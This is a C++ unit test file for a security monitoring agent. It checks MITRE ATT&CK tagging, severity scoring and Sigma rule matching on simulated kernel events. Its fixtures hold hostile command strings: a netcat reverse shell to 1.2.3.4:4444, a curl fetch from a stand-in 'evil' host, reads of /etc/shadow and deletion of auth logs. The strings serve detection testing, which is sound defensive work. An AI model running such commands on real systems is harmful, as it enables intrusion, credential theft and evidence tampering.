// test_t29.cpp — T29 — Unit test for the new enrichers (mitre/severity/sigma).
// Compile with: g++ -std=c++17 -I src test_t29.cpp src/agent/mitre_mapping.cpp \
//               src/agent/severity_scorer.cpp src/agent/sigma_engine.cpp -o test_t29
// Then run: ./test_t29
#include "agent/mitre_mapping.hpp"
#include "agent/severity_scorer.hpp"
#include "agent/sigma_engine.hpp"
#include <cassert>
#include <iostream>
#include <string>
#include <vector>

using namespace logsoc::agent;

static int passed = 0, failed = 0;
#define CHECK(cond, label) do { \
    if (cond) { std::cout << "  [OK]   " << label << "\n"; passed++; } \
    else      { std::cout << "  [FAIL] " << label << "\n"; failed++; } \
} while(0)

static bool contains(const std::vector<std::string>& v, const std::string& s) {
    for (const auto& x : v) if (x == s) return true;
    return false;
}

int main() {
    std::cout << "=== T29 unit tests ===\n\n";

    // ── 1. MITRE tag_event() ───────────────────────────────────────────
    std::cout << "MITRE tag_event():\n";

    // Modload by root → T1547.006 + T1014
    auto m1 = mitre::MitreMapping::tag_event(17, "kworker", "", 0, 0);
    CHECK(contains(m1, "T1547.006"), "modload → T1547.006 (kernel module)");
    CHECK(contains(m1, "T1014"),     "modload → T1014 (rootkit)");

    // ptrace → T1055
    auto m2 = mitre::MitreMapping::tag_event(10, "gdb", "", 0, 0);
    CHECK(contains(m2, "T1055"), "ptrace → T1055 (process injection)");

    // connect to port 4444 → T1071 + T1059.003
    auto m3 = mitre::MitreMapping::tag_event(3, "curl", "", 0, 4444);
    CHECK(contains(m3, "T1071"),     "connect → T1071 (app layer protocol)");
    CHECK(contains(m3, "T1059.003"), "connect:4444 → T1059.003 (cmd shell bind)");

    // vfs_open on /etc/shadow → T1003.008
    auto m4 = mitre::MitreMapping::tag_event(13, "cat", "/etc/shadow", 0, 0);
    CHECK(contains(m4, "T1003.008"), "vfs_open /etc/shadow → T1003.008");

    // unlink /var/log/auth.log → T1070.002 + T1070.004
    auto m5 = mitre::MitreMapping::tag_event(6, "shred", "/var/log/auth.log", 0, 0);
    CHECK(contains(m5, "T1070.002"), "unlink /var/log → T1070.002 (log clearing)");
    CHECK(contains(m5, "T1070.004"), "unlink → T1070.004 (file deletion)");

    // execve nc → T1059.004
    auto m6 = mitre::MitreMapping::tag_event(2, "nc", "nc -e /bin/sh 1.2.3.4 4444", 0, 0);
    CHECK(contains(m6, "T1059.004"), "execve nc → T1059.004 (Unix shell)");

    // execve curl → T1105
    auto m7 = mitre::MitreMapping::tag_event(2, "curl", "curl http://evil/x.sh", 0, 0);
    CHECK(contains(m7, "T1105"), "execve curl → T1105 (ingress tool transfer)");

    // execve python → T1059.006
    auto m8 = mitre::MitreMapping::tag_event(2, "python3", "python3 -c 'import os;...'", 0, 0);
    CHECK(contains(m8, "T1059.006"), "execve python → T1059.006");

    // accept on 4444 by ncat → T1059 + T1505.003
    auto m9 = mitre::MitreMapping::tag_event(14, "ncat", "", 0, 4444);
    CHECK(contains(m9, "T1505.003"), "accept:4444 ncat → T1505.003 (web shell)");

    // ── 2. severity_scorer ────────────────────────────────────────────
    std::cout << "\nseverity_scorer:\n";

    // Modload by non-modprobe comm with sensitive path
    auto s1 = severity::score({17, "kworker", "/tmp/evil.ko", 0, 0, 2});
    CHECK(s1 >= 80, "modload + sensitive = high (got " + std::to_string(s1) + ")");
    CHECK(std::string(severity::score_to_severity(s1)) == "critical" ||
          std::string(severity::score_to_severity(s1)) == "high",
          "modload maps to high/critical");

    // Plain fim
    auto s2 = severity::score({4, "vim", "/home/user/test.txt", 1000, 0, 0});
    CHECK(s2 <= 20, "plain fim = info (got " + std::to_string(s2) + ")");

    // FIM on /etc/shadow by root
    auto s3 = severity::score({4, "cat", "/etc/shadow", 0, 0, 1});
    CHECK(s3 >= 50, "/etc/shadow + root = medium+ (got " + std::to_string(s3) + ")");

    // execve nc
    auto s4 = severity::score({2, "nc", "nc -e /bin/sh", 0, 0, 1});
    CHECK(s4 >= 20, "execve nc = low+ (got " + std::to_string(s4) + ")");

    // ptrace on /proc/pid/mem by root
    auto s5 = severity::score({10, "gdb", "/proc/1234/mem", 0, 0, 2});
    CHECK(s5 >= 75, "ptrace /proc/pid/mem by root = high+ (got " + std::to_string(s5) + ")");

    // ── 3. sigma_engine ───────────────────────────────────────────────
    std::cout << "\nsigma_engine:\n";

    // Modload event
    auto h1 = sigma::match(R"({"event":"modload","uid":0})");
    bool has_modload = false, has_subtype_init = false, has_subtype_finit = false;
    for (const auto& h : h1) {
        if (h.id == "modload_by_root")     has_modload = true;
        if (h.id == "init_module_by_root") has_subtype_init = true;
        if (h.id == "finit_module_by_root") has_subtype_finit = true;
    }
    CHECK(has_modload, "modload event matches 'modload_by_root'");
    CHECK(!h1.empty(), "modload event has >=1 sigma hits");

    auto h1b = sigma::match(R"({"event":"modload","subtype":"finit_module"})");
    bool has_finit = false;
    for (const auto& h : h1b) if (h.id == "finit_module_by_root") has_finit = true;
    CHECK(has_finit, "finit_module subtype matches 'finit_module_by_root'");

    auto h2 = sigma::match(R"({"event":"vfs_open","path":"/etc/shadow"})");
    bool has_etc = false;
    for (const auto& h : h2) if (h.id == "etc_shadow_read") has_etc = true;
    CHECK(has_etc, "/etc/shadow read matches 'etc_shadow_read'");

    auto h3 = sigma::match(R"({"event":"unlink","path":"/var/log/auth.log"})");
    bool has_log = false;
    for (const auto& h : h3) if (h.id == "var_log_unlink") has_log = true;
    CHECK(has_log, "/var/log unlink matches 'var_log_unlink'");

    auto h4 = sigma::match(R"({"event":"connect","dst_port":4444})");
    bool has_4444 = false;
    for (const auto& h : h4) if (h.id == "outbound_to_shell_port") has_4444 = true;
    CHECK(has_4444, "connect:4444 matches 'outbound_to_shell_port'");

    auto h5 = sigma::match(R"({"event":"write","fd":1,"count":42})");
    CHECK(h5.empty(), "plain write matches nothing (no false positives)");

    std::cout << "\n=== " << passed << " passed, " << failed << " failed ===\n";
    return failed == 0 ? 0 : 1;
}
